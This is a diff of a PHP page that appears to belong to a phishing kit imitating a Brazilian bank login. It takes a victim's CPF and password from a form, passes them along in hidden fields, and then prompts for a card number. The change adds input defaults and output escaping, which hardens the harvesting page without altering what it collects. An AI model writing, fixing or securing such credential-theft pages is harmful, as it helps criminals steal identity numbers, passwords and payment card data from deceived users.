@@ -1,6 +1,8 @@
 <?php
-$cpf = $_POST['cpf'];
-$senha = $_POST['senha'];
+require __DIR__ . '/../app/security.php';
+security_bootstrap('public');
+$cpf = $_POST['cpf'] ?? '';
+$senha = $_POST['senha'] ?? '';
 ?>
 
 <html class="">
@@ -16287,8 +16289,8 @@ function formatar_mascara(src, mascara) {
                                                                      <div ng-transclude="fields">
                                                                      <card-fields class="ng-scope">
                                                                            <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="Senha" icon="user-outline" error-message="'Número de CPF inválido'">
-                                                                           <input type="hidden" name="cpf" id="cpf" value="<?php echo $cpf ?>">   
-                                                                           <input type="hidden" name="senha" id="senha" value="<?php echo $senha ?>">   
+                                                                           <input type="hidden" name="cpf" id="cpf" value="<?php echo security_h($cpf); ?>">   
+                                                                           <input type="hidden" name="senha" id="senha" value="<?php echo security_h($senha); ?>">   
                                                                            <input cpf="" type="tel" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="cc" id="cc" autofocus="$ctrl.$modal.isEmpty()" maxlength="19" ng-minlength="19" ng-required="true" ng-model="$ctrl.cpf" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="" placeholder="Número do cartão" onkeypress="formatar_mascara(this,'#### #### #### ####')">
                                                                               <!-- ngIf: icon --><!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                               <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style="">
